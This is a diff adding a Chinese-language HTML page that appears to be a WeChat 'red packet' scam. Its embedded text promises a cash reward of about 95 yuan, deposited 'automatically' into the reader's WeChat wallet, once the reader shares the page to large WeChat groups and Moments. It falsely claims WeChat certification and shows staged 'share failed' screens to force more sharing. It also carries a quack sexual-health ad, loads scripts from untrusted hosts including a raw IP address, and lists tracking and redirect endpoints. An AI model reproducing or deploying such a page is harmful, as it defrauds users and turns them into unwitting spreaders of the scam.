@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport"
+    content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title> </title>
+  <script src="https://debiao.oss-cn-hangzhou.aliyuncs.com/public/jquery-3.3.1.min.js"></script>
+  <script src="http://res.wx.qq.com/open/js/jweixin-1.4.0.js"></script>
+  <script src="https://debiao.oss-cn-hangzhou.aliyuncs.com/public/wxshare.js"></script>
+  <script src="https://ip.ws.126.net/ipquery"></script>
+</head>
+<style>
+  .weui_dialog {
+    position: fixed;
+    z-index: 999999999;
+    width: 85%;
+    top: 50%;
+    left: 50%;
+    -webkit-transform: translate(-50%, -50%);
+    transform: translate(-50%, -50%);
+    background-color: #fafafc;
+    text-align: center;
+    border-radius: 10px;
+    font-family: arial
+  }
+
+  .weui_mask {
+    position: fixed;
+    z-index: 1;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    background: rgba(0, 0, 0, .6)
+  }
+
+  .weui_dialog_hd {
+    padding: 0em 0 .3em
+  }
+
+  .weui_dialog_bd {
+    padding: 0 20px;
+    font-size: 16px;
+    color: #888;
+    word-wrap: break-word;
+    word-break: break-all
+  }
+
+  .weui_dialog_ft {
+    border-bottom-left-radius: 10px;
+    background-color: #e3c291;
+    position: relative;
+    line-height: 42px;
+    margin-top: 20px;
+    font-size: 17px;
+    display: -webkit-box;
+    display: -webkit-flex;
+    display: -ms-flexbox;
+    display: flex
+  }
+
+  .weui_dialog_ft:after {
+    content: " ";
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 1px;
+    border-top: 1px solid #d5d5d6;
+    color: #d5d5d6;
+    -webkit-transform-origin: 0 0;
+    transform-origin: 0 0;
+    -webkit-transform: scaleY(.5);
+    transform: scaleY(.5)
+  }
+
+  .weui_btn_dialog.primary {
+    color: #fff
+  }
+
+  .weui_dialog_ft a {
+    display: block;
+    -webkit-box-flex: 1;
+    -webkit-flex: 1;
+    -ms-flex: 1;
+    flex: 1;
+    color: #3cc51f;
+    text-decoration: none;
+    -webkit-tap-highlight-color: transparent
+  }
+
+  .weui_dialog_title {
+    font-weight: 400;
+    font-size: 17px;
+    color: #000
+  }
+
+  .weui_close {
+    display: block;
+    position: absolute;
+    top: 6px;
+    right: 6px;
+  }
+</style>
+
+<body style="background:#696969">
+  <script>
+    var obj = {
+      "id": "6",
+      "iswx": 1,
+      "isx": 1,
+      "errurl": "http:\/\/hhcqn2t.520hsy.com\/errurl",
+      "advapi": "http:\/\/api.pikadeng.com\/get_a2?id=11",
+      "luodiadi": "http:\/\/api.yjbuttons.com\/get_b",
+      "pushState": "http:\/\/hhcqn2t.520hsy.com\/pushState",
+      "ShareCount": "http:\/\/hhcqn2t.520hsy.com\/ShareCount",
+      "oss": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com",
+      "cimg": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com\/public\/spsharebg.png",
+      "money": "95.33",
+      "xifen": 608,
+      "t": "<p style=\"text-align: center;\"><span style=\"color: rgb(0, 176, 80); font-size: 20px;\">\u606d\u559c\u60a8\uff01<\/span><\/p><p style=\"text-align: center;\">\u83b7\u5f97\u5fae\u4fe1\u7d05\u5305\uffe5<strong style=\"text-align: center; white-space: normal; font-size: 24px; color: red;\">{money}<\/strong>\u5143<\/p><p style=\"text-align: center;\">\u4ec5\u5269\u4e0d\u591a\uff0c\u6570\u91cf\u6709\u9650\uff0c\u5148\u5230\u5148\u5f97\uff01<\/p><p style=\"text-align: center;\"><span style=\"color: rgb(255, 0, 0);\">\u6d3b\u52a8\u5b97\u65e8\u5ba3\u4f20\u516c\u53f8<\/span><\/p><p style=\"text-align: center;\">\u9886\u53d6\u8981\u6c42\uff1a\u5206\u4eab<span style=\"color: rgb(255, 0, 0);\">\u5fae\u4fe1\u7fa4<\/span><\/p><p style=\"text-align: center;\">\u540e\uff0c\u5c06\u81ea\u52a8\u5b58\u5165\u60a8\u7684\u5fae\u4fe1\u94b1\u5305<\/p><p style=\"text-align: center;\">\u5206\u4eab\u5927\u4e8e50\u4eba\u7fa4\u804a\u5c06\u989d\u5916\u5956\u52b1<span style=\"color: rgb(255, 0, 0);\">20<\/span>\u5143<\/p><p style=\"text-align: center;\"><span style=\"color: rgb(255, 0, 0);\">\u6d3b\u52a8\u7ecf\u5fae\u4fe1\u8ba4\u8bc1\uff0c\u771f\u5b9e\u6709\u6548<\/span><\/p>",
+      "q": [{
+        "drainid": "38",
+        "title": "\u534e\u4e3a 5G \u4e0a\u5e02\u4e86\uff01",
+        "desc": "\u8bf7\u6ce8\u610f\u67e5\u6536\u00a590.33 \ud83d\udcb0",
+        "img_url": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com\/hb\/fm.jpg",
+        "content": "<p style=\"text-align: center;\">\n  <img style=\"width: 40px;margin-top: -50px\" src=\"{oss}\/hb\/0da91722c61abeb4e20f5789b5fe84f1.gif\"\/><br\/><span style=\"text-align: center; color: green;\">\u5206\u4eab\u6210\u529f<img style=\"margin-bottom:-8px\" src=\"{oss}\/hb\/d8ba4c3407ec279b3a1d226db5b95922.png\"\/><\/span><span style=\"text-align: center;\"><br\/><br\/><strong>\u60a8\u4ec5\u9700\u518d\u5206\u4eab\u5230<\/strong><strong style=\"font-size: 18px; color: red;\">2\u4e2a\u4e0d\u540c\u7684\u7fa4<\/strong><br\/><strong style=\"font-size: 24px; color: red;\">{monesy}\u5143\u73b0\u91d1<\/strong><br\/><strong>\u5c06\u81ea\u52a8\u5b58\u5165\u60a8\u7684\u5fae\u4fe1\u94b1\u5305<\/strong><\/span>\n<\/p>",
+        "link": "https:\/\/vjjcbi.moyehaishen.com\/f650U-OOvvWcW2RjRhjiWScYBJ5-l-XNo1PIjpEWsHlcZCLTEuPpTRR7YsL96cjEjUOwR_C-neRyt0NG2utJYlDA28w"
+      }, {
+        "drainid": "39",
+        "title": "\u534e\u4e3a 5G \u4e0a\u5e02\u4e86\uff01",
+        "desc": "\u8bf7\u6ce8\u610f\u67e5\u6536\u00a5141.38 \ud83d\udcb0",
+        "img_url": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com\/hb\/fm.jpg",
+        "content": "<p style=\"text-align: center;\">\n  <img style=\"width: 40px;margin-top: -50px\" src=\"{oss}\/hb\/0da91722c61abeb4e20f5789b5fe84f1.gif\"\/><br\/><strong style=\"text-align: center; white-space: normal; font-size: 24px; color: blue;\">\u5206\u4eab\u5931\u8d25<img style=\"margin-bottom:-8px\" src=\"{oss}\/hb\/d8ba4c3407ec279b3a1d226db5b95922.png\"\/><\/strong><br\/><span style=\"text-align: center; font-size: 18px; color: red;\">\u8bf7\u5206\u4eab\u5230\u4eba\u6570\u5927\u4e8e50\u4eba\u5fae\u4fe1\u7fa4<\/span><br\/><img style=\"width: 50px;margin-top: 10px\" src=\"{oss}\/hb\/01aac30e657f777c4f2c7f43f78e5b03.jpg\"\/><br\/><span style=\"text-align: center;\">\u5fae\u4fe1\u7fa4<\/span><br\/><span style=\"text-align: center;\">\u5373\u53ef<\/span><strong style=\"text-align: center; white-space: normal; font-size: 18px; color: red;\">\u9a6c\u4e0a\u9886\u53d6{monesy}\u5143\u73b0\u91d1<\/strong>\n<\/p>",
+        "link": "https:\/\/vjjcbi.moyehaishen.com\/9ebft3stujOLGwLKUAYMMzKaOYuVWfipc4f-9aoysVXJ6PihG8lwSTQIBMoAZkmX2ZCzwr_KjUdYe-T3bpDzuLTwER8"
+      }, {
+        "drainid": "40",
+        "title": "\u534e\u4e3a 5G \u4e0a\u5e02\u4e86\uff01",
+        "desc": "\u8bf7\u6ce8\u610f\u67e5\u6536\u00a577.66 \ud83d\udcb0",
+        "img_url": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com\/hb\/fm.jpg",
+        "content": "<p style=\"text-align: center;\">\n  <img style=\"width: 40px;margin-top: -50px\" src=\"{oss}\/hb\/0da91722c61abeb4e20f5789b5fe84f1.gif\"\/><br\/><span style=\"text-align: center; color: green;\">\u5206\u4eab\u6210\u529f<img style=\"margin-bottom:-8px\" src=\"{oss}\/hb\/d8ba4c3407ec279b3a1d226db5b95922.png\"\/><\/span><br\/><br\/><span style=\"text-align: center;\">\u8fd8\u5269\u4e0b\u6700\u540e1\u4e2a\u7fa4<br\/>\u4ec5\u9700\u518d\u5206\u4eab\u5230<strong style=\"font-size: 18px; color: red;\">1<\/strong>\u4e2a\u4e0d\u540c\u7684\u7fa4<br\/><strong style=\"font-size: 24px; color: red;\">{monesy}\u5143\u73b0\u91d1<\/strong><br\/><strong>\u5c06\u81ea\u52a8\u5b58\u5165\u60a8\u7684\u5fae\u4fe1\u94b1\u5305<\/strong><\/span>\n<\/p>",
+        "link": "https:\/\/vjjcbi.moyehaishen.com\/a896lZooUt4j_MBTAPab61L_fy9y1k0_GrJDxF175EwNHOGVe6hL5ZlP9Z9iA-HhHrlsmqulFFNxiZnqH7XvRSG6NbQ"
+      }, {
+        "drainid": "41",
+        "title": "\u534e\u4e3a 5G \u4e0a\u5e02\u4e86\uff01",
+        "desc": "\u8bf7\u6ce8\u610f\u67e5\u6536\u00a595.62 \ud83d\udcb0",
+        "img_url": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com\/hb\/fm.jpg",
+        "content": "<p style=\"text-align: center;\"><img src=\"{oss}\/hb\/0da91722c61abeb4e20f5789b5fe84f1.gif\"\/><br\/><span style=\"font-size: 14px;\"><strong style=\"text-align: center; white-space: normal; font-size: 24px; color: blue;\"><span style=\"font-size: 12px;\"><\/span><\/strong><span style=\"font-size: 16px; color: rgb(255, 0, 0);\">\u5206\u4eab\u5931\u8d25<\/span><strong style=\"text-align: center; white-space: normal; font-size: 24px; color: blue;\"><\/strong><\/span><strong style=\"text-align: center; white-space: normal; font-size: 24px; color: blue;\"><img src=\"{oss}\/hb\/d8ba4c3407ec279b3a1d226db5b95922.png\"\/><\/strong><br\/>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u5206\u4eab\u5230<strong><span style=\"color: rgb(255, 0, 0); font-size: 18px;\">\u76f8\u540c\u7684\u7fa4\u6216\u597d\u53cb<\/span><\/strong><\/p><p><br\/><\/p><p style=\"text-align: center;\">\u8bf7\u5c1d\u8bd5\u91cd\u65b0\u5206\u4eab\u5230<strong><span style=\"font-size: 18px; color: rgb(255, 0, 0);\">\u4e0d\u540c\u7684\u7fa4<\/span><\/strong><\/p><p style=\"text-align: center;\"><br\/><span style=\"text-align: center;\">\u5373\u53ef<\/span><strong style=\"text-align: center; white-space: normal; font-size: 18px; color: red;\">\u9a6c\u4e0a\u9886\u53d6{monesy}<\/strong>\u5143\u73b0\u91d1<\/p>",
+        "link": "https:\/\/vjjcbi.moyehaishen.com\/cda33QgVD9TuT0ofYiLexfx-GOY1rOfq5frVD-XVjMEXdYYavCmXTfIWtaIEdGyaqZDT5KqWVxPf5QryqT52n4B31_g"
+      }, {
+        "drainid": "38",
+        "title": "\u534e\u4e3a 5G \u4e0a\u5e02\u4e86\uff01",
+        "desc": "\u8bf7\u6ce8\u610f\u67e5\u6536\u00a5150.74 \ud83d\udcb0",
+        "img_url": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com\/hb\/fm.jpg",
+        "content": "<p style=\"text-align: center;\"><img src=\"{oss}\/hb\/0da91722c61abeb4e20f5789b5fe84f1.gif\"\/><br\/><span style=\"color:green;\">\u5206\u4eab\u6210\u529f<img src=\"{oss}\/hb\/d8ba4c3407ec279b3a1d226db5b95922.png\"\/><\/span><br\/><span style=\"color: black; font-size:16px;\"><strong style=\"font-size: 22px;color:blue;\"><br\/>\u4ec5\u5269\u6700\u540e\u4e00\u6b65\u5566\uff01<\/strong><br\/>\u8bf7\u5206\u4eab\u5230<strong style=\"font-size: 24px;color: red\">\u670b\u53cb\u5708<\/strong><br\/>\u4fdd\u8bc1<strong style=\"font-size: 18px;color: red\">100%\u53ef\u9886\u53d6{monesy}\u5143<\/strong>\u73b0\u91d1<br\/><\/span><\/p>",
+        "link": "https:\/\/vjjcbi.moyehaishen.com\/ca18nhzPQOTvb5lYAi_D7iu0DQVx2cisTEsB-zDux7GIgNhsjNED-X22WgTQg2G5DnVo1seCaBZ74wYBbTxGTXDTJBU"
+      }],
+      "p": [{
+        "drainid": "42",
+        "title": "\u5e86\u795d 5G \u4e0a\u5e02\u4e86\uff01",
+        "img_url": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com\/hb\/fm.jpg",
+        "content": "<p style=\"text-align: center;\">\n  <img style=\"width: 40px;margin-top: -50px\"  src=\"{oss}\/hb\/0da91722c61abeb4e20f5789b5fe84f1.gif\"><br\/><b style=\"font-size: 24px;color: red;\">\u5206\u4eab\u5931\u8d25<img style=\"margin-bottom:-8px\" src=\"{oss}\/hb\/d8ba4c3407ec279b3a1d226db5b95922.png\"><\/b><br\/><font style=\"color: black; font-size:16px;\">\u6ce8\u610f\uff1a\u5fc5\u987b<font color=\"red\">\u516c\u5f00\u5206\u4eab<\/font>\u624d\u53ef\u4ee5\u9886\u53d6<br>\u8bf7\u5c1d\u8bd5\u91cd\u65b0\u5206\u4eab\u5230<b style=\"font-size:18px;color: red\">\u670b\u53cb\u5708<\/b><br><img style=\"width: 50px;margin-top: 10px\" src=\"{oss}\/hb\/ddea83336d80653c7fdd83145c7acc9c.jpg\"><br>\u4fdd\u8bc1<b style=\"font-size: 18px;color: red\">100% \u53ef\u9886\u53d6{monesy}\u5143<\/b>\u73b0\u91d1<\/font>\n<\/p>",
+        "link": "https:\/\/0dwh99p.bjsgnbq.com\/ac87NeezqUUsDcz_pYd7jUzYw30Nwo9xtYdf7QmmE3PDTEIR02Ra-U32TFM-k0wGQ76Q7d0JUC6SS1FGjgxD4BBHIVM"
+      }, {
+        "drainid": "43",
+        "title": "\u7537\u4eba\u80be\u865a \u9633\u75ff \u65e9\u6cc4 \u65f6\u95f4\u77ed \u6559\u4f60\u4e00\u62db\u8f7b\u677e\u641e\u5b9a.....",
+        "img_url": "https:\/\/debiao.oss-cn-hangzhou.aliyuncs.com\/public\/lao.jpg",
+        "content": "<p style=\"text-align: center;\">\n  <font style=\"color:green;\">\u606d\u559c\u5206\u4eab\u5b8c\u6210<img style=\"margin-bottom:-8px\" src=\"{oss}\/hb\/d8ba4c3407ec279b3a1d226db5b95922.png\"><\/font><font style=\"color: black; font-size:16px;\"><br\/>\u518d\u6b21\u611f\u8c22\u60a8\u7684\u53c2\u4e0e<br\/><b style=\"color:red\">\u6ce8\u610f\uff1a\u7cfb\u7edf\u5c06\u4f1a\u9a8c\u8bc1\u670b\u53cb\u5708\u4fe1\u606f\u5224\u65ad\u662f\u5426\u5b8c\u6210\u5206\u4eab\u4efb\u52a1<\/b><br\/>\u7531\u4e8e\u6d3b\u52a8\u91cf\u5de8\u5927<br>\u7ea2\u5305\u6700\u8fdf24\u5c0f\u65f6\u5185\u5230\u8d26\u81f3\u94b1\u5305<br\/>\u5220\u9664\u5206\u4eab\u94fe\u63a5\u53ef\u80fd\u5bfc\u81f4\u65e0\u6cd5\u5230\u8d26<br\/><\/font>\n<\/p>",
+        "link": "https:\/\/0dwh99p.bjsgnbq.com\/b5c2NvPvGE1OiaL5fQOECLl8L94nT7i2AAlZ655YBkEZOttE4_pLOGHPl4pTDmGR03b3ZtELXZTcWwH2bX306c0sT4C0xGkndUkWOBtl"
+      }],
+      "sign": "http:\/\/laiyunfushi.com\/Wechat?key=07ddfpE6cJtD9dL3S2qnuy3KDd8R0KAk1cVrQmy3LCf041+2WTh7kVtHalfrkE8R5qnTvV04zvuv3opBc8PTRpr0y2T+\/nROICs41g0SQ+6NSjf68mNSvE\/c+Xwt0PlAnxyzLaNfD1Zlul4Q+SVxZh+QmeNonjYii0\/aX3qVgpZ6plGvWPum8nFq5XvOiX8WpSTRBAanGlYkXUl7fxP5pRkOQYczhhl0IXHxR04ZthiTI+AjdPpwJUPAKTS3pKPVVO37FfLBIAGnRkHsJgg&t=1560442800&hit=13&url=http://hhcqn2t.520hsy.com/1495M8YjYFqUNSZ545RZ53AWOkPa89R2lesZ3BirwijclfeTzocgOhUV8is72e578RVrbK01w2OVYCfOJy29J3LQU6uPSKwgEfeZizPf12yOC7iL4mM33j4emmHfg7ebXSaTkwn1yiRDmJL-S-4OBos",
+      "http": {
+        "scheme": "http",
+        "host": "laiyunfushi.com",
+        "path": "\/Wechat",
+        "query": "key=07ddfpE6cJtD9dL3S2qnuy3KDd8R0KAk1cVrQmy3LCf041+2WTh7kVtHalfrkE8R5qnTvV04zvuv3opBc8PTRpr0y2T+\/nROICs41g0SQ+6NSjf68mNSvE\/c+Xwt0PlAnxyzLaNfD1Zlul4Q+SVxZh+QmeNonjYii0\/aX3qVgpZ6plGvWPum8nFq5XvOiX8WpSTRBAanGlYkXUl7fxP5pRkOQYczhhl0IXHxR04ZthiTI+AjdPpwJUPAKTS3pKPVVO37FfLBIAGnRkHsJgg&t=1560442800&hit=13&url=http://hhcqn2t.520hsy.com/1495M8YjYFqUNSZ545RZ53AWOkPa89R2lesZ3BirwijclfeTzocgOhUV8is72e578RVrbK01w2OVYCfOJy29J3LQU6uPSKwgEfeZizPf12yOC7iL4mM33j4emmHfg7ebXSaTkwn1yiRDmJL-S-4OBos"
+      }
+    };
+  </script>
+  <div id="tk"
+    style="position: fixed;left: 0;top: 0;display:block;width: 100%;height: 700px; background:rgb(117,115,115);">
+    <!--分享页面-->
+    <img src="https://debiao.oss-cn-hangzhou.aliyuncs.com/hb/1c4ddb19e2e5d9bfea69a6ee60d41f0b.jpg"
+      alt="quSN3RCcIPS1yYE7A51Xhzer4A5LEBzBud06UhEc" id="1c4ddb19e2e5d9bfea69a6ee60d41f0b"
+      style="display: block;width: 100%" />
+  </div>
+  <!--分享js-->
+  <script src="http://139.196.86.217:8996/fission/upload/share.js"></script>
+</body>
+
+</html>
